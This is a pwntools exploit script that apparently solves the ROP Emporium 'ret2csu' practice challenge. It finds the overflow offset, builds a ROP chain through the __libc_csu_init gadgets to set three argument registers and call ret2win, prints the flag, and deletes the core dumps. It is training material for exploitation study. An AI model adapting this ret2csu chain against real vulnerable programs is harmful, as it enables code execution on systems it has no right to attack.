from pwn import *
import os

#
# Context
#

e = context.binary = ELF('ret2csu')

#
# Offset
#

io = process(e.path)
io.sendlineafter(b'>', cyclic(0x200))
io.wait()
core = io.corefile
io.close()
offset = cyclic_find(core.read(core.rsp, 4))

info(f'Offset: {offset}')

#
# ROP
#

RET2WIN         = p64(e.plt['ret2win'])
GMON_START      = p64(e.got['__gmon_start__'])

POP_RDI         = p64(next(e.search(asm('pop rdi; ret;'))))
POP_RSI_R15     = p64(next(e.search(asm('pop rsi; pop r15; ret;'))))

# Missing the right gadget to directly pop rdx (ret2csu)
CSU_CALLQ       = p64(next(e.search(asm('mov rdx, r15; mov rsi, r14; mov edi, r13d; call QWORD PTR [r12+rbx*8]'))))
CSU_POP         = p64(next(e.search(asm('pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret;'))))

#
# Exploit
#

io = process(e.path)

payload  = b''
payload += b'A' * offset

payload += CSU_POP
payload += p64(0)                   # RBX -> CALL (0 bcuz we don't want offset)
payload += p64(1)                   # RBP -> Gonna be compared with RBX + 1
payload += p64(0x0000000000600df8)  # R12 -> CALL -> Junk function (__init_array_end)
payload += p64(0xdeadbeefdeadbeef)  # R13 -> EDI
payload += p64(0xcafebabecafebabe)  # R14 -> RSI
payload += p64(0xd00df00dd00df00d)  # R15 -> RDX
payload += CSU_CALLQ
payload += b'JUNKJUNK' * 7

payload += POP_RDI
payload += p64(0xdeadbeefdeadbeef)
payload += RET2WIN

io.sendafter(b'> ', payload)

info(f'Flag: {io.recvrepeat(1).decode().splitlines()[1]}')

os.system('rm core*')